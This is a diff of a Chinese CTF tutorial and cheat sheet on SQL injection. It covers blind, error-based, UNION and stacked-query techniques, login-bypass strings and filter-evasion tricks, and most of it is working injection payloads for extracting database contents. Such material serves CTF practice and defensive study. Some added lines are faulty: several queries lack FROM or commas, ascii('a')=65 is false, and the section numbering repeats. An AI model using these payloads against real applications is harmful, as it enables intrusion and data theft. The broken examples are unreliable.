@@ -1,38 +1,19 @@
----
-title: CTF中的SQL注入
-date: 2020-03-10 21:46:37
-comments: true
-toc: true
-categories:
-- CTF
-tags:
-- SQL注入
----
-
-### **1 何为SQL注入？**
-
+# **CTF中的SQL注入**
+## **何为SQL注入？**
 SQL注入是一种注入攻击，由于用户的输入也是SQL执行语句的一部分，所以攻击者可以利用有注入漏洞的功能点，注入自己定义的语句，改变SQL语句结构，从而影响执行逻辑，让数据库执行任意的指令，查询数据库中任何自己需要的数据，甚至可以直接获取数据库服务器的系统权限。
-
-### **2 盲注**
+# **1 盲注**
 所谓盲注的本质就是猜解，就是通过“感觉”来判断当前字段是否存在注入，那何为感觉？答案是：差异（感觉到运行时间的差异和页面返回结果的差异）。也就是说我们通过构造一条语句来注入到SQL布尔表达式中，使得布尔表达式执行结果的真假直接影响整条语句的执行使得系统呈现不同的反应，布尔盲注就是页面返回内容有差异，时间盲注就是执行时间有差异。
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20200312214229745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)
-
-#### 2.1 Bool盲注
-
-常用于猜解数据的表达式：
+## **1.1 Bool盲注**
+常用于猜解数据的逻辑表达式：
 ```sql
 and 0、and 1、or 1、1 & 1、id = 0 | 1、id = 0 | 0、id = 1^0、id = 0||1
-
 ELT(N ,str1 ,str2 ,str3 ,…)
 函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL
-
 1'+(select case when 1=1 then 0 else 1 end) and '1'='1
+if(((expression))<'a',sleep(1),0)
 ```
-#### 2.2 基于时间的盲注
-
+## **1.2 基于时间的盲注**
 基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段。
-
 常用函数：sleep() 和 benchmark()函数
 ```sql
 id = 1-sleep(2)
@@ -43,15 +24,37 @@ insert 和 update 的基于时间盲注示例
 update users set username = '0'|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;
 insert into users values (16,'dds','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
 ```
-
 由于是盲注，我们看不到我们的数据回显，我们只能根据返回去猜解，那么在对数据库一无所知的情况下我们只能一位一位地猜解，这里就会用到一些截断函数以及一些转换函数。
 比较常见的是
 ```sql
 mid() substr() locate() position() substring() left() regexp like rlike length() char_length() ord() ascii() char() hex()
-```
-以及他们的同义函数等，当然这里还可能会需要很多的转换，比如过滤了等于号可以通过正则或者 in 或者大于小于号等替换之类的，这部分内容我会放在别的文章梳理一下，这里就不赘述了。
 
-参见拆解表达式填充位置：
+/******************************left()函数:*******************************/
+left(database(),1)>'s'
+left(database(),1)='s'
+Explain:database()显示数据库名称，left(a,b)从左侧截取a的前b位
+
+/****************************substr()函数:*******************************/
+substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1)='a'
+substr(a,b,c)从b位置开始，截取字符串a的c长度。
+
+/****************************mid()函数:*******************************/
+mid((select user limit 0,1)0,1)='s'
+mid(a,b,c)从位置b开始，截取a字符串的第c位
+注意substr()与mid()函数,第一个是截取x个长度,第二个是截取第x位.
+
+/****************************ascii()函数:*******************************/
+ascii('a')=65
+ascii(substr(select * from user limit 0,1)1,1)=62
+ascii(substr((select database()),1,1))=98
+Ascii()将某个字符转换为ascii值,结合substr一起使用可以来判断括号条件内首字母对应的ascii码大小,然后判断首字母是什么
+
+/****************************ord()函数:*******************************/
+Ord()函数同ascii()，将字符转为ascii值
+ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98
+ord与mid函数同样可以结合在一起使用,与上面类似
+```
+以及他们的同义函数等，当然这里还可能会需要很多的转换，比如过滤了等于号可以通过正则或者 in 或者大于小于号等替换之类的，这部分内容我会放在别的文章梳理一下，这里就不赘述了。参见猜解表达式填充位置：
 ```sql
 ' or (payload) or ' 
 ' and (payload) and ' 
@@ -63,10 +66,8 @@ mid() substr() locate() position() substring() left() regexp like rlike length()
 " +(payload) + "
 ......
 ```
-
-### **3 报错注入**
-
-#### 3.1 xpath解析错误型报错
+# **2 报错注入**
+## **2.1 xpath解析错误型报错**
 这里一般只用到了两个函数，extractvalue（）、updatexml（），关于两个函数的功能，有不清楚的可以自行查阅学习，这里不做过多介绍。报错原因很简单，updatexml第二个参数需要的是Xpath格式的字符串，如果我们输入的不符合，就会报错。报错回显内容的最大长度是32位的，所以有所局限。因此遇到一些比较长的字符需要主出时候，常常配合mid()、substr等函数执行多次查询，最后的结果由这些碎片字符进行拼接。
 
 常见套路：
@@ -110,10 +111,7 @@ INSERT INTO security.user (id, uname, passwd,email) VALUES (211,1=updatexml(0,co
 SELECT * from users where id =1 and updatexml(1,make_set(3,'~',(select flag from flag)),1)
 [Err] 1105 - XPATH syntax error: '~,flag{abdg678899nsn-dhsns98dj-d'
 ```
-
-
-#### 3.2 利用几何函数报错
-
+## **2.2 利用几何函数报错**
 mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错
 ```sql
 1. geometrycollection()
@@ -140,8 +138,7 @@ SELECT * FROM users where id = 1 - Polygon(id)
 [SQL]SELECT * FROM users where id = 1 - Polygon(id)
 [Err] 1367 - Illegal non geometric '`awd_bank`.`users`.`id`' value found during parsing
 ```
-
-#### 3.3 concat+rand()+group_by()导致主键重复
+## **2.3 concat+rand()+group_by()导致主键重复**
 ```sql
 select count(*) from users group by concat(version(),floor(rand(0)*2));
 [SQL]select count(*) from users group by concat(version(),floor(rand(0)*2));
@@ -151,11 +148,8 @@ select count(*),concat(table_name,floor(rand(0)*2))x from information_schema.tab
 [SQL]select count(*),concat(table_name,floor(rand(0)*2))x from information_schema.tables group by x;
 [Err] 1062 - Duplicate entry 'global_variables0' for key '<group_key>'
 ```
-
-#### 3.4 重复列名报错
-
+## **2.4 重复列名报错**
 使用列名重复来进行报错注入
-
 name_const报错型注入
 ```sql
 name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式
@@ -169,8 +163,7 @@ ERROR 1060 (42S21): Duplicate column name 'id'
 mysql> select * from(select * from test a join test b using(id))c;
 ERROR 1060 (42S21): Duplicate column name 'name'
 ```
-
-#### 3.5 整数溢出报错
+## **2.5 整数溢出报错**
 测试发现在mysql5.5.47可以在报错中返回查询结果：而在mysql>5.5.53时，则不能返回查询结果。
 ```sql
 mysql> select exp(~(select*from(select user())x));
@@ -185,9 +178,7 @@ from `awd_bank`.`users` limit 1) > (select
 `awd_bank`.`users`.`id`,`awd_bank`.`users`.`username`,`awd_bank`.`users`.`password`,`awd_bank`.`users`.`money`
 from `awd_bank`.`users` limit 1)),18446744073709551610,18446744073709551610))'
 ```
-
-### 4 UNION联合查询注入
-
+# **3 UNION联合查询注入**
 当页面存在明显数据查询回显的时候，同时又存在 SQL注入漏洞，这时候可尝试通过union查询注出需要的数据。比如：
 ?id=1 注入，首先通过order by猜测列数，?id=1' order by 5%23，最后发现order by 后为3的时候不报错，因此可以判断改SQL语句查询的结果有3列。
 ```sql
@@ -207,16 +198,37 @@ id=0' union select 1,database(),3 %23
 例如：
 ```sql
 select * from users where id =1 union select (SELECT e.3 from(SELECT * from (SELECT 1)a,(SELECT 2)b,(SELECT 3)c,(SELECT 4)d union SELECT * from users)e LIMIT 1 OFFSET 1)f,(select 1)g,(select 1)h,(select 1)i;
+```
+# **4 堆叠注入**
+原理：利用;结束语句并插入自己的sql语句<br>
+适用：
+Mysql、SqlServer、Postgresql(Oracle不行)
+只有当调用数据库函数支持执行多条sql语句时才能够使用，例如mysqli_multi_query()函数就支持多条sql语句同时执行。PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入。
+```sql
+-1;show tables%23
+-1';show columns from `1919810931114514`%23
+利用存储过程绕过select过滤
+inject=1%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql;#
+```
+
+# **5 万能密码**
+```sql
+【=】优先于【and】，【and】优先于【or】，且适用传递性
+select * from *** where username ="" and password="";
+Select * from user where username ='admin' or '1'='1' and password ='';
+Select * from user where username ='1'or '1'='1'#' and password ='';
+Select * from user where username ='' and password ='Abc' or '1'='1'#';
+admin' or 1=1--;
+等等
 
 ```
 
-### **5 绕过姿势备忘录**
-
+# **4 绕过姿势备忘录**
 |相关姿势                          |                      具体描述
 -|-|
-|or and过滤                        |	大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/\*or\*/<br>利用符号 and=&& or=\|\||
+|or and过滤                        |	大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/\*or\*/<br>利用符号 and=&& or=\|\|<br>admin'%(ascii(mid(database()) from 1 for 1)=90)%'1<br>admin'^(1)^'1'|
 |空格过滤                           | %09 TAB键（水平）%0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键（垂直） %a0 空格 |
 |关键字的绕过                       | 注释符绕过:uni/\*\*/on se/\*\*/lect <br> 大小写绕过:UniOn SeleCt <br> 双关键字绕过:ununionion seselectlect <br> <>绕过:unio<>n sel<>ect <br>/\*!00000select\*/绕过关键字和正则过滤
 |宽字节注入                        | 过滤单引号时，可以试试宽字节%bf%27 %df%27 %aa%27|
 |大于号小于号拦截绕过               | id=1 and greatest(ascii(substr(username,1,1)),1)=97 <br> id=1 and strcmp(ascii(substr(username,1,1)),1); <br> id = 1 and substr(username,1,1) in ('a'); <br> id = 1 and substr(username,1,1) between 0x61 and 0x63;|
-|逗号绕过                          | 在使用盲注的时候，需要使用到substr(),mid(),limit；这些子句方法都需要使用到逗号。<br>对于substr()和mid()这两个方法可以使用from for的方式来解决，limit则可以用offset<br>select * from sql_test where ascii(mid(username from 1 for 1))>1;<br>substr(x from 1 for 1) mid(x from 1 for 1)<br>select查询时候不使用逗号进行注入的姿势<br>id=3' union select * from(select database()) a join (select version() ) b %23<br>?id=3' union select * from (select group_concat(table_name ) from information_schema.tables where table_schema = 'sqli' ) a join (select version() ) b %23<br>id=' union select * from (select group_concat(column_name) from information_schema.columns where table_name = 'users' ) a join (select version() ) b %23<br>id=' union select * from (select group_concat(username) from users) a join (select group_concat(flag_9c861b688330) from users) b %23
+|逗号绕过                          | 在使用盲注的时候，需要使用到substr(),mid(),limit；这些子句方法都需要使用到逗号。<br>对于substr()和mid()这两个方法可以使用from for的方式来解决，limit则可以用offset<br>select * from sql_test where ascii(mid(username from 1 for 1))>1;<br>substr(x from 1 for 1) mid(x from 1 for 1)<br>select查询时候不使用逗号进行注入的姿势<br>id=3' union select * from(select database()) a join (select version() ) b %23<br>?id=3' union select * from (select group_concat(table_name ) from information_schema.tables where table_schema = 'sqli' ) a join (select version() ) b %23<br>id=' union select * from (select group_concat(column_name) from information_schema.columns where table_name = 'users' ) a join (select version() ) b %23<br>id=' union select * from (select group_concat(username) from users) a join (select group_concat(flag_9c861b688330) from users) b %23<br>1' select case when (substring(select flag from flag from i for 1))=j) then sleep(6) else 0 end and '1'='1<br>1'+substring(select(flag)from(flag)from(i)for(1))=j<br>0'^(select hex(hex(substr((select flag from flag) from {i} for 1))))^'0<br>
